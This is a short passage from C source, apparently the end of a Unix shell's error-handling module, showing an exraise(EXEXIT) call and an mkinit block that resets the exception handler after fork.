	exraise(EXEXIT);
	/* NOTREACHED */
}

#ifdef mkinit
INCLUDE "error.h"

	FORKRESET
{
	handler = &main_handler;
}
#endif
